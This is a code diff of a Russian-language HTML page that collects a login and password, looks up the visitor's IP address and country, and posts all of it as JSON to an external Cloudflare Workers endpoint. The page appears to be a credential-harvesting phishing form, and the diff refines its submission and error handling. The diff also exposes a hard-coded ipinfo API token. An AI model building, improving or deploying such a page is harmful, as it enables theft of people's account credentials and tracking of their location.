@@ -23,9 +23,7 @@
       border-radius: 10px;
       text-align: center;
     }
-    h2 {
-      margin-bottom: 20px;
-    }
+    h2 { margin-bottom: 20px; }
     input {
       width: 100%;
       padding: 10px;
@@ -41,23 +39,17 @@
       border-radius: 5px;
       cursor: pointer;
     }
-    button:hover {
-      background-color: #0056b3;
-    }
-    .output {
-      margin-top: 20px;
-    }
-    .flag {
-      font-size: 30px;
-    }
+    button:hover { background-color: #0056b3; }
+    .output { margin-top: 20px; }
+    .flag { font-size: 30px; }
   </style>
 </head>
 <body>
 
   <div class="container">
     <h2>Введите данные для отправки</h2>
-    <form action="https://mute-scene-f7f5.kamrantataloo69.workers.dev/" method="POST" id="loginForm">
-      <input type="text" name="login" placeholder="Login" required><br>
+    <form id="loginForm">
+      <input type="text" name="login"    placeholder="Login"    required><br>
       <input type="password" name="password" placeholder="Password" required><br>
       <button type="submit">Отправить</button>
     </form>
@@ -65,12 +57,15 @@
     <div class="output">
       <p><strong>IP адрес:</strong> <span id="ip">Загрузка...</span></p>
       <p><strong>Страна:</strong> <span id="country">Загрузка...</span></p>
-      <p><img id="flag" src="" alt="Flag" class="flag"></p>
+      <p><span id="flag" class="flag"></span></p>
     </div>
   </div>
 
   <script>
-    // Функция для преобразования кода страны в emoji флаг
+    const WORKER_URL = 'https://mute-scene-f7f5.kamrantataloo69.workers.dev/';
+    let clientIp = 'unknown', clientCountry = 'unknown';
+
+    // Функция для флага
     function countryCodeToFlagEmoji(countryCode) {
       return countryCode
         .toUpperCase()
@@ -79,46 +74,53 @@
         .join('');
     }
 
-    let clientIp = 'unknown', clientCountry = 'unknown';
-
-    // Запрос на получение IP
+    // 1) Получаем IP
     fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
+      .then(r => r.json())
       .then(json => {
         clientIp = json.ip;
         document.getElementById('ip').textContent = clientIp;
+        // 2) Получаем страну по IP (подставляем ваш токен)
         return fetch(`https://ipinfo.io/${clientIp}/json?token=12e7da7cd87750`);
       })
-      .then(res => res.json())
+      .then(r => r.json())
       .then(info => {
-        clientCountry = info.country;
+        clientCountry = info.country || '—';
         const flagEmoji = countryCodeToFlagEmoji(clientCountry);
-        document.getElementById('country').textContent = `${flagEmoji} ${clientCountry}`;
-        document.getElementById('flag').src =
-          `https://flagcdn.com/w80/${clientCountry.toLowerCase()}.png`;
+        document.getElementById('country').textContent = clientCountry;
+        document.getElementById('flag').textContent = flagEmoji;
       })
-      .catch(() => {
+      .catch(err => {
+        console.warn('Ошибка IP/страны:', err);
         document.getElementById('country').textContent = '—';
       });
 
-    // Обработка отправки формы
+    // 3) Обработка отправки формы
     document.getElementById('loginForm').addEventListener('submit', async e => {
       e.preventDefault();
       const form = e.target;
       const payload = {
-        ip: clientIp,
-        country: clientCountry,
-        login: form.login.value,
+        ip:       clientIp,
+        country:  clientCountry,
+        login:    form.login.value,
         password: form.password.value
       };
-      await fetch('https://mute-scene-f7f5.kamrantataloo69.workers.dev/', {
+
+      const resp = await fetch(WORKER_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        body:    JSON.stringify(payload)
       });
-      alert('Данные отправлены!');
-      form.reset();
+
+      if (resp.ok) {
+        alert('Данные отправлены!');
+        form.reset();
+      } else {
+        alert('Ошибка отправки');
+        console.error(await resp.text());
+      }
     });
   </script>
+
 </body>
 </html>
